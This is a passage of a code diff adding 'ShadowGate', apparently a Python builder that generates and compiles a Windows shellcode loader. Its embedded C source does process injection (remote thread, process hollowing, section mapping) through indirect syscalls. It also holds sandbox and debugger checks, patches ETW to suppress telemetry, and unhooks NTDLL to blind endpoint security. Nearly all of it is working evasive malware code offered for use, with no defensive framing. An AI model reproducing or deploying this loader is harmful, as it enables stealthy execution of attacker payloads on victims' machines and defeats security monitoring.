+    LOG_INFO("Thread Pool: Target PID: %lu", dwPid);
+#endif
+    
+    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+    CLIENT_ID cid = { 0 };
+    cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwPid;
+    
+    HANDLE hProcess = NULL;
+    PrepareNextSyscall(IDX_NtOpenProcess);
+    NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtOpenProcess failed: 0x%08X", status);
+#endif
+        return FALSE;
+    }
+    
+    PVOID pRemoteBase = NULL;
+    SIZE_T regionSize = pCtx->dwShellcodeSize + 0x1000;
+    
+    PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
+    status = NtAllocateVirtualMemory(hProcess, &pRemoteBase, 0, &regionSize,
+                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtAllocateVirtualMemory failed: 0x%08X", status);
+#endif
+        NtClose(hProcess);
+        return FALSE;
+    }
+    
+    SIZE_T bytesWritten = 0;
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    status = NtWriteVirtualMemory(hProcess, pRemoteBase, pCtx->pShellcode,
+                                   pCtx->dwShellcodeSize, &bytesWritten);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtWriteVirtualMemory failed: 0x%08X", status);
+#endif
+        NtClose(hProcess);
+        return FALSE;
+    }
+    
+    PVOID pAddr = pRemoteBase;
+    regionSize = pCtx->dwShellcodeSize + 0x1000;
+    ULONG oldProtect = 0;
+    
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    NtProtectVirtualMemory(hProcess, &pAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    HANDLE hThread = NULL;
+    PrepareNextSyscall(IDX_NtCreateThreadEx);
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
+                               pRemoteBase, NULL, 0, 0, 0, 0, NULL);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtCreateThreadEx failed: 0x%08X", status);
+#endif
+        NtClose(hProcess);
+        return FALSE;
+    }
+    
+    pCtx->hProcess = hProcess;
+    pCtx->hThread = hThread;
+    pCtx->pRemoteBase = pRemoteBase;
+    pCtx->bSuccess = TRUE;
+    
+    return TRUE;
+}
+
+// ============================================================================
+// Method 4: Process Hollowing
+// ============================================================================
+
+BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
+    WCHAR wszPath[MAX_PATH] = { 0 };
+    GetSystemDirectoryW(wszPath, MAX_PATH);
+    lstrcatW(wszPath, L"\\");
+    lstrcatW(wszPath, pCtx->wszTargetProcess);
+    
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = { 0 };
+    
+    if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE,
+                       CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+#if DEBUG_BUILD
+        LOG_ERROR("CreateProcessW failed: %lu", GetLastError());
+#endif
+        return FALSE;
+    }
+    
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_FULL;
+    
+    if (!GetThreadContext(pi.hThread, &ctx)) {
+#if DEBUG_BUILD
+        LOG_ERROR("GetThreadContext failed: %lu", GetLastError());
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+    PVOID pRemoteBase = NULL;
+    SIZE_T regionSize = pCtx->dwShellcodeSize + 0x1000;
+    
+    PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
+    NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &pRemoteBase, 0, &regionSize,
+                                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtAllocateVirtualMemory failed: 0x%08X", status);
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+    SIZE_T bytesWritten = 0;
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    status = NtWriteVirtualMemory(pi.hProcess, pRemoteBase, pCtx->pShellcode,
+                                   pCtx->dwShellcodeSize, &bytesWritten);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtWriteVirtualMemory failed: 0x%08X", status);
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+    ctx.Rcx = (DWORD64)pRemoteBase;
+    
+    if (!SetThreadContext(pi.hThread, &ctx)) {
+#if DEBUG_BUILD
+        LOG_ERROR("SetThreadContext failed: %lu", GetLastError());
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+    PrepareNextSyscall(IDX_NtResumeThread);
+    ULONG suspendCount = 0;
+    NtResumeThread(pi.hThread, &suspendCount);
+    
+    pCtx->hProcess = pi.hProcess;
+    pCtx->hThread = pi.hThread;
+    pCtx->pRemoteBase = pRemoteBase;
+    pCtx->bSuccess = TRUE;
+    
+    return TRUE;
+}
+
+// ============================================================================
+// Method 5: Section Mapping
+// ============================================================================
+
+BOOL InjectMapping(PINJECTION_CONTEXT pCtx) {
+    DWORD dwPid = pCtx->dwTargetPid;
+    
+    if (dwPid == 0) {
+        dwPid = FindProcessByName(pCtx->wszTargetProcess);
+    }
+    
+    if (dwPid == 0) {
+        WCHAR wszPath[MAX_PATH] = { 0 };
+        GetSystemDirectoryW(wszPath, MAX_PATH);
+        lstrcatW(wszPath, L"\\");
+        lstrcatW(wszPath, pCtx->wszTargetProcess);
+        
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        
+        if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            return FALSE;
+        }
+        
+        Sleep(1000);
+        dwPid = pi.dwProcessId;
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    
+    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+    CLIENT_ID cid = { 0 };
+    cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwPid;
+    
+    HANDLE hProcess = NULL;
+    PrepareNextSyscall(IDX_NtOpenProcess);
+    NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+    
+    if (!NT_SUCCESS(status)) {
+        return FALSE;
+    }
+    
+    HANDLE hSection = NULL;
+    LARGE_INTEGER sectionSize = { 0 };
+    sectionSize.QuadPart = pCtx->dwShellcodeSize + 0x1000;
+    
+    PrepareNextSyscall(IDX_NtCreateSection);
+    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
+                              PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+    
+    if (!NT_SUCCESS(status)) {
+        NtClose(hProcess);
+        return FALSE;
+    }
+    
+    PVOID pLocalView = NULL;
+    SIZE_T viewSize = 0;
+    
+    PrepareNextSyscall(IDX_NtMapViewOfSection);
+    status = NtMapViewOfSection(hSection, (HANDLE)-1, &pLocalView, 0, 0, NULL,
+                                 &viewSize, 2, 0, PAGE_READWRITE);
+    
+    if (!NT_SUCCESS(status)) {
+        NtClose(hSection);
+        NtClose(hProcess);
+        return FALSE;
+    }
+    
+    memcpy(pLocalView, pCtx->pShellcode, pCtx->dwShellcodeSize);
+    
+    PVOID pRemoteView = NULL;
+    viewSize = 0;
+    
+    PrepareNextSyscall(IDX_NtMapViewOfSection);
+    status = NtMapViewOfSection(hSection, hProcess, &pRemoteView, 0, 0, NULL,
+                                 &viewSize, 2, 0, PAGE_EXECUTE_READ);
+    
+    if (!NT_SUCCESS(status)) {
+        NtUnmapViewOfSection((HANDLE)-1, pLocalView);
+        NtClose(hSection);
+        NtClose(hProcess);
+        return FALSE;
+    }
+    
+    PrepareNextSyscall(IDX_NtUnmapViewOfSection);
+    NtUnmapViewOfSection((HANDLE)-1, pLocalView);
+    
+    HANDLE hThread = NULL;
+    PrepareNextSyscall(IDX_NtCreateThreadEx);
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
+                               pRemoteView, NULL, 0, 0, 0, 0, NULL);
+    
+    if (!NT_SUCCESS(status)) {
+        NtUnmapViewOfSection(hProcess, pRemoteView);
+        NtClose(hSection);
+        NtClose(hProcess);
+        return FALSE;
+    }
+    
+    NtClose(hSection);
+    
+    pCtx->hProcess = hProcess;
+    pCtx->hThread = hThread;
+    pCtx->pRemoteBase = pRemoteView;
+    pCtx->bSuccess = TRUE;
+    
+    return TRUE;
+}
+
+// ============================================================================
+// Main Dispatcher
+// ============================================================================
+
+BOOL PerformInjection(PINJECTION_CONTEXT pCtx) {
+    switch (pCtx->dwInjectionMethod) {
+        case INJECT_STOMP:
+#if DEBUG_BUILD
+            LOG_INFO("Using Module Stomping");
+#endif
+            return InjectModuleStomp(pCtx);
+        
+        case INJECT_EARLYBIRD:
+#if DEBUG_BUILD
+            LOG_INFO("Using Early Bird APC");
+#endif
+            return InjectEarlyBird(pCtx);
+        
+        case INJECT_THREADPOOL:
+#if DEBUG_BUILD
+            LOG_INFO("Using Remote Thread");
+#endif
+            return InjectThreadPool(pCtx);
+        
+        case INJECT_HOLLOWING:
+#if DEBUG_BUILD
+            LOG_INFO("Using Process Hollowing");
+#endif
+            return InjectProcessHollowing(pCtx);
+        
+        case INJECT_MAPPING:
+#if DEBUG_BUILD
+            LOG_INFO("Using Section Mapping");
+#endif
+            return InjectMapping(pCtx);
+        
+        default:
+            return FALSE;
+    }
+}
+'''
+
+    def _generate_evasion_files(self) -> dict:
+        """Generate evasion-related files"""
+        files = {}
+        files['evasion.h'] = self._generate_evasion_h()
+        files['evasion.cpp'] = self._generate_evasion_cpp()
+        return files
+    
+    def _generate_evasion_h(self) -> str:
+        """Generate evasion.h"""
+        return '''#ifndef _EVASION_H
+#define _EVASION_H
+
+#include <windows.h>
+#include "common.h"
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// ============================================================================
+// Sandbox Evasion
+// ============================================================================
+
+BOOL PerformSandboxChecks(VOID);
+BOOL CheckCPUCount(VOID);
+BOOL CheckRAM(VOID);
+BOOL CheckScreenResolution(VOID);
+BOOL CheckDebugger(VOID);
+BOOL CheckUptime(VOID);
+
+// ============================================================================
+// ETW Patching
+// ============================================================================
+
+BOOL PatchETW(VOID);
+
+// ============================================================================
+// NTDLL Unhooking
+// ============================================================================
+
+BOOL UnhookNtdll(VOID);
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _EVASION_H
+'''
+    
+    def _generate_evasion_cpp(self) -> str:
+        """Generate evasion.cpp"""
+        return '''/*
+ * ShadowGate - Evasion Techniques
+ * Sandbox detection, ETW patching, NTDLL unhooking
+ */
+
+#include "evasion.h"
+#include "syscalls.h"
+#include "resolver.h"
+#include <stdio.h>
+
+// Forward declaration
+extern "C" void PrepareNextSyscall(DWORD dwIndex);
+
+// ============================================================================
+// Sandbox Check: CPU Count
+// ============================================================================
+
+BOOL CheckCPUCount(VOID) {
+    SYSTEM_INFO si = { 0 };
+    GetSystemInfo(&si);
+    
+#if DEBUG_BUILD
+    LOG_INFO("CPU Count: %lu", si.dwNumberOfProcessors);
+#endif
+    
+    // Most VMs/sandboxes have 1-2 CPUs
+    return (si.dwNumberOfProcessors >= 2);
+}
+
+// ============================================================================
+// Sandbox Check: RAM
+// ============================================================================
+
+BOOL CheckRAM(VOID) {
+    MEMORYSTATUSEX ms = { 0 };
+    ms.dwLength = sizeof(ms);
+    GlobalMemoryStatusEx(&ms);
+    
+    DWORD dwRamGB = (DWORD)(ms.ullTotalPhys / 1024 / 1024 / 1024);
+    
+#if DEBUG_BUILD
+    LOG_INFO("RAM: %lu GB", dwRamGB);
+#endif
+    
+    // Most sandboxes have < 4GB RAM
+    return (dwRamGB >= 2);
+}
+
+// ============================================================================
+// Sandbox Check: Screen Resolution
+// ============================================================================
+
+BOOL CheckScreenResolution(VOID) {
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+    
+#if DEBUG_BUILD
+    LOG_INFO("Screen: %dx%d", width, height);
+#endif
+    
+    // Sandboxes often have low resolution
+    return (width >= 800 && height >= 600);
+}
+
+// ============================================================================
+// Sandbox Check: Debugger Detection
+// ============================================================================
+
+BOOL CheckDebugger(VOID) {
+    // Check IsDebuggerPresent
+    if (IsDebuggerPresent()) {
+#if DEBUG_BUILD
+        LOG_ERROR("Debugger detected (IsDebuggerPresent)");
+#endif
+        return FALSE;
+    }
+    
+    // Check remote debugger
+    BOOL bRemoteDebugger = FALSE;
+    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bRemoteDebugger);
+    if (bRemoteDebugger) {
+#if DEBUG_BUILD
+        LOG_ERROR("Remote debugger detected");
+#endif
+        return FALSE;
+    }
+    
+    // Check NtGlobalFlag in PEB
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    if (pPeb && (pPeb->NtGlobalFlag & 0x70)) {  // FLG_HEAP_* flags
+#if DEBUG_BUILD
+        LOG_ERROR("Debug flags in PEB detected");
+#endif
+        return FALSE;
+    }
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("No debugger detected");
+#endif
+    
+    return TRUE;
+}
+
+// ============================================================================
+// Sandbox Check: System Uptime
+// ============================================================================
+
+BOOL CheckUptime(VOID) {
+    DWORD dwUptime = GetTickCount64() / 1000 / 60;  // Minutes
+    
+#if DEBUG_BUILD
+    LOG_INFO("System uptime: %lu minutes", dwUptime);
+#endif
+    
+    // Fresh sandboxes usually have very low uptime
+    return (dwUptime >= 10);  // At least 10 minutes
+}
+
+// ============================================================================
+// Main Sandbox Check
+// ============================================================================
+
+BOOL PerformSandboxChecks(VOID) {
+#if DEBUG_BUILD
+    LOG_INFO("Running sandbox evasion checks...");
+#endif
+    
+    if (!CheckCPUCount()) {
+#if DEBUG_BUILD
+        LOG_ERROR("CPU count check failed");
+#endif
+        return FALSE;
+    }
+    
+    if (!CheckRAM()) {
+#if DEBUG_BUILD
+        LOG_ERROR("RAM check failed");
+#endif
+        return FALSE;
+    }
+    
+    if (!CheckScreenResolution()) {
+#if DEBUG_BUILD
+        LOG_ERROR("Screen resolution check failed");
+#endif
+        return FALSE;
+    }
+    
+    if (!CheckDebugger()) {
+        return FALSE;  // Already logged
+    }
+    
+    // Uptime check is informational, don't fail
+    CheckUptime();
+    
+    return TRUE;
+}
+
+// ============================================================================
+// ETW Patching
+// Patches EtwEventWrite to return 0 (success) immediately
+// ============================================================================
+
+BOOL PatchETW(VOID) {
+    // Get NTDLL base
+    PVOID pNtdll = GetNtdllFromPEB();
+    if (!pNtdll) {
+        return FALSE;
+    }
+    
+    // Find EtwEventWrite
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
+    
+    PDWORD pNames = (PDWORD)((PBYTE)pNtdll + pExport->AddressOfNames);
+    PDWORD pFuncs = (PDWORD)((PBYTE)pNtdll + pExport->AddressOfFunctions);
+    PWORD pOrdinals = (PWORD)((PBYTE)pNtdll + pExport->AddressOfNameOrdinals);
+    
+    PVOID pEtwEventWrite = NULL;
+    
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        LPCSTR szName = (LPCSTR)((PBYTE)pNtdll + pNames[i]);
+        if (strcmp(szName, "EtwEventWrite") == 0) {
+            pEtwEventWrite = (PVOID)((PBYTE)pNtdll + pFuncs[pOrdinals[i]]);
+            break;
+        }
+    }
+    
+    if (!pEtwEventWrite) {
+#if DEBUG_BUILD
+        LOG_ERROR("EtwEventWrite not found");
+#endif
+        return FALSE;
+    }
+    
+#if DEBUG_BUILD
+    LOG_INFO("EtwEventWrite @ 0x%p", pEtwEventWrite);
+#endif
+    
+    // Patch bytes: xor eax, eax; ret (return 0)
+    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
+    
+    // Change protection
+    PVOID pAddr = pEtwEventWrite;
+    SIZE_T regionSize = sizeof(patch);
+    ULONG oldProtect = 0;
+    
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    NTSTATUS status = NtProtectVirtualMemory(
+        (HANDLE)-1, &pAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("Failed to change ETW protection");
+#endif
+        return FALSE;
+    }
+    
+    // Write patch
+    memcpy(pEtwEventWrite, patch, sizeof(patch));
+    
+    // Restore protection
+    pAddr = pEtwEventWrite;
+    regionSize = sizeof(patch);
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    NtProtectVirtualMemory((HANDLE)-1, &pAddr, &regionSize, oldProtect, &oldProtect);
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("ETW patched successfully");
+#endif
+    
+    return TRUE;
+}
+
+// ============================================================================
+// NTDLL Unhooking
+// Restores original NTDLL .text section from disk
+// ============================================================================
+
+BOOL UnhookNtdll(VOID) {
+    // Get current NTDLL base
+    PVOID pCurrentNtdll = GetNtdllFromPEB();
+    if (!pCurrentNtdll) {
+        return FALSE;
+    }
+    
+    // Get clean NTDLL from disk
+    PVOID pCleanNtdll = GetFreshNtdll();
+    if (!pCleanNtdll) {
+#if DEBUG_BUILD
+        LOG_ERROR("Failed to load clean NTDLL");
+#endif
+        return FALSE;
+    }
+    
+    // Parse headers
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCurrentNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pCurrentNtdll + pDos->e_lfanew);
+    
+    PIMAGE_DOS_HEADER pCleanDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
+    PIMAGE_NT_HEADERS pCleanNt = (PIMAGE_NT_HEADERS)((PBYTE)pCleanNtdll + pCleanDos->e_lfanew);
+    
+    // Find .text section
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+    PIMAGE_SECTION_HEADER pCleanSection = IMAGE_FIRST_SECTION(pCleanNt);
+    
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (strncmp((char*)pSection->Name, ".text", 5) == 0) {
+            // Found .text section
+            PVOID pCurrentText = (PVOID)((PBYTE)pCurrentNtdll + pSection->VirtualAddress);
+            
+            // Find corresponding section in clean NTDLL (raw offset)
+            PVOID pCleanText = (PVOID)((PBYTE)pCleanNtdll + pCleanSection->PointerToRawData);
+            DWORD dwTextSize = pSection->Misc.VirtualSize;
+            
+#if DEBUG_BUILD
+            LOG_INFO("NTDLL .text: 0x%p, size: %lu", pCurrentText, dwTextSize);
+#endif
+            
+            // Change protection to RWX
+            PVOID pAddr = pCurrentText;
+            SIZE_T regionSize = dwTextSize;
+            ULONG oldProtect = 0;
+            
+            PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+            NTSTATUS status = NtProtectVirtualMemory(
+                (HANDLE)-1, &pAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+            
+            if (!NT_SUCCESS(status)) {
+                VirtualFree(pCleanNtdll, 0, MEM_RELEASE);
+                return FALSE;
+            }
+            
+            // Copy clean .text over hooked .text
+            memcpy(pCurrentText, pCleanText, dwTextSize);
+            
+            // Restore protection
+            pAddr = pCurrentText;
+            regionSize = dwTextSize;
+            PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+            NtProtectVirtualMemory((HANDLE)-1, &pAddr, &regionSize, oldProtect, &oldProtect);
+            
+#if DEBUG_BUILD
+            LOG_SUCCESS("NTDLL unhooked successfully");
+#endif
+            
+            VirtualFree(pCleanNtdll, 0, MEM_RELEASE);
+            return TRUE;
+        }
+        
+        pSection++;
+        pCleanSection++;
+    }
+    
+    VirtualFree(pCleanNtdll, 0, MEM_RELEASE);
+    return FALSE;
+}
+'''
+
+    def _generate_common_files(self) -> dict:
+        """Generate common header files"""
+        files = {}
+        files['common.h'] = self._generate_common_h()
+        return files
+    
+    def _generate_common_h(self) -> str:
+        """Generate common.h with Windows structures"""
+        return '''#ifndef _COMMON_H
+#define _COMMON_H
+
+#include <windows.h>
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// ============================================================================
+// NT Status Macros
+// ============================================================================
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
+#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+
+// ============================================================================
+// Process/Thread Access Rights
+// ============================================================================
+
+#define PROCESS_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF)
+#define THREAD_ALL_ACCESS  (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF)
+
+// ============================================================================
+// Section Constants
+// ============================================================================
+
+#ifndef SEC_COMMIT
+#define SEC_COMMIT 0x8000000
+#endif
+
+#ifndef SECTION_ALL_ACCESS
+#define SECTION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | \\
+                           SECTION_MAP_WRITE | SECTION_MAP_READ | \\
+                           SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE)
+#endif
+
+// ============================================================================
+// NT Structures
+// ============================================================================
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+// ============================================================================
+// PEB Structures
+// ============================================================================
+
+typedef struct _PEB_LDR_DATA {
+    ULONG       Length;
+    BOOLEAN     Initialized;
+    HANDLE      SsHandle;
+    LIST_ENTRY  InLoadOrderModuleList;
+    LIST_ENTRY  InMemoryOrderModuleList;
+    LIST_ENTRY  InInitializationOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+typedef struct _PEB {
+    BOOLEAN                 InheritedAddressSpace;
+    BOOLEAN                 ReadImageFileExecOptions;
+    BOOLEAN                 BeingDebugged;
+    BOOLEAN                 SpareBool;
+    HANDLE                  Mutant;
+    PVOID                   ImageBaseAddress;
+    PPEB_LDR_DATA           Ldr;
+    PVOID                   ProcessParameters;
+    PVOID                   SubSystemData;
+    PVOID                   ProcessHeap;
+    PVOID                   FastPebLock;
+    PVOID                   AtlThunkSListPtr;
+    PVOID                   IFEOKey;
+    PVOID                   CrossProcessFlags;
+    PVOID                   KernelCallbackTable;
+    ULONG                   SystemReserved;
+    ULONG                   AtlThunkSListPtr32;
+    PVOID                   ApiSetMap;
+    ULONG                   TlsExpansionCounter;
+    PVOID                   TlsBitmap;
+    ULONG                   TlsBitmapBits[2];
+    PVOID                   ReadOnlySharedMemoryBase;
+    PVOID                   SharedData;
+    PVOID*                  ReadOnlyStaticServerData;
+    PVOID                   AnsiCodePageData;
+    PVOID                   OemCodePageData;
+    PVOID                   UnicodeCaseTableData;
+    ULONG                   NumberOfProcessors;
+    ULONG                   NtGlobalFlag;
+    // ... more fields
+} PEB, *PPEB;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY      InLoadOrderLinks;
+    LIST_ENTRY      InMemoryOrderLinks;
+    LIST_ENTRY      InInitializationOrderLinks;
+    PVOID           DllBase;
+    PVOID           EntryPoint;
+    ULONG           SizeOfImage;
+    UNICODE_STRING  FullDllName;
+    UNICODE_STRING  BaseDllName;
+    ULONG           Flags;
+    WORD            LoadCount;
+    WORD            TlsIndex;
+    LIST_ENTRY      HashLinks;
+    PVOID           SectionPointer;
+    ULONG           CheckSum;
+    ULONG           TimeDateStamp;
+    PVOID           LoadedImports;
+    PVOID           EntryPointActivationContext;
+    PVOID           PatchInformation;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+// ============================================================================
+// Debug Macros
+// ============================================================================
+
+#ifndef DEBUG_BUILD
+#define DEBUG_BUILD 0
+#endif
+
+#if DEBUG_BUILD
+    #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_ERROR(fmt, ...)   printf("[!] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_PHASE(fmt, ...)   printf("\\n[=] " fmt "\\n", ##__VA_ARGS__)
+#else
+    #define LOG_INFO(fmt, ...)
+    #define LOG_SUCCESS(fmt, ...)
+    #define LOG_ERROR(fmt, ...)
+    #define LOG_PHASE(fmt, ...)
+#endif
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _COMMON_H
+'''
+# ============================================================================
+# Main Builder Class
+# ============================================================================
+
+class ShadowGateBuilder:
+    """Main builder class that orchestrates the entire build process"""
+    
+    def __init__(self, config: BuildConfig = None):
+        self.base_dir = Path(__file__).parent.parent
+        self.output_dir = self.base_dir / "output"
+        self.profiles_dir = self.base_dir / "profiles"
+        
+        self.config = config or BuildConfig()
+        self.config_manager = ConfigManager(str(self.profiles_dir))
+        self.compiler = MSVCCompiler(verbose=True)
+        self.entropy_analyzer = EntropyAnalyzer()
+    
+    def print_banner(self):
+        """Print the banner"""
+        print(colored(BANNER.format(version=VERSION), Colors.CYAN))
+    
+    def print_config(self):
+        """Print current configuration"""
+        print(colored("\n[*] Build Configuration:", Colors.BOLD))
+        print(f"    Syscall Method:  {colored(self.config.syscall.upper(), Colors.YELLOW)}")
+        print(f"    NTDLL Resolver:  {colored(self.config.resolver.upper(), Colors.YELLOW)}")
+        print(f"    String Hiding:   {colored(self.config.strings.upper(), Colors.YELLOW)}")
+        print(f"    Encryption:      {colored(self.config.encrypt.upper(), Colors.YELLOW)}")
+        print(f"    Encoding:        {colored(self.config.encode.upper(), Colors.YELLOW)}")
+        print(f"    Injection:       {colored(self.config.inject.upper(), Colors.YELLOW)}")
+        print(f"    Target Process:  {colored(self.config.target, Colors.YELLOW)}")
+        print(f"    Sandbox Checks:  {colored('ENABLED' if self.config.sandbox else 'DISABLED', Colors.GREEN if self.config.sandbox else Colors.RED)}")
+        print(f"    ETW Patching:    {colored('ENABLED' if self.config.etw else 'DISABLED', Colors.GREEN if self.config.etw else Colors.RED)}")
+        print(f"    NTDLL Unhook:    {colored('ENABLED' if self.config.unhook else 'DISABLED', Colors.GREEN if self.config.unhook else Colors.RED)}")
+        print(f"    Initial Sleep:   {self.config.sleep} seconds")
+        print(f"    Debug Build:     {colored('YES' if self.config.debug else 'NO', Colors.YELLOW if self.config.debug else Colors.CYAN)}")
+    
+    def read_shellcode(self, filepath: str) -> bytes:
+        """Read shellcode from file"""
+        with open(filepath, 'rb') as f:
+            return f.read()
+    
+    def write_files(self, files: Dict[str, str]) -> bool:
+        """Write generated files to output directory"""
+        try:
+            # Create output directory
+            self.output_dir.mkdir(exist_ok=True)
+            
+            for filename, content in files.items():
+                filepath = self.output_dir / filename
+                
+                # Determine write mode based on file type
+                if filename.endswith('.asm'):
+                    # Assembly files need specific encoding
+                    with open(filepath, 'w', encoding='utf-8', newline='\r\n') as f:
+                        f.write(content)
+                else:
+                    with open(filepath, 'w', encoding='utf-8') as f:
+                        f.write(content)
+                
+                print(f"    Written: {filename}")
+            
+            return True
+        
+        except Exception as e:
+            print(colored(f"[!] Failed to write files: {e}", Colors.RED))
+            return False
+    
+    def build(self, no_compile: bool = False) -> bool:
+        """
+        Main build process
+        
+        Args:
+            no_compile: If True, only generate source files without compiling
+            
+        Returns:
+            True if build successful
+        """
+        self.print_banner()
+        
+        # Validate configuration
+        valid, msg = self.config.validate()
+        if not valid:
+            print(colored(f"[!] Configuration error: {msg}", Colors.RED))
+            return False
+        
+        self.print_config()
+        
+        # Read shellcode
+        print(colored(f"\n[*] Reading shellcode: {self.config.input_file}", Colors.CYAN))
+        try:
+            shellcode = self.read_shellcode(self.config.input_file)
+        except Exception as e:
+            print(colored(f"[!] Failed to read shellcode: {e}", Colors.RED))
+            return False
+        
+        print(f"    Size: {len(shellcode):,} bytes")
+        
+        # Analyze input shellcode
+        input_entropy = self.entropy_analyzer.calculate_entropy(shellcode)
+        print(f"    Entropy: {input_entropy:.2f}")
+        
+        # Generate code
+        generator = CodeGenerator(self.config, self.base_dir)
+        
+        try:
+            files = generator.generate(shellcode)
+        except Exception as e:
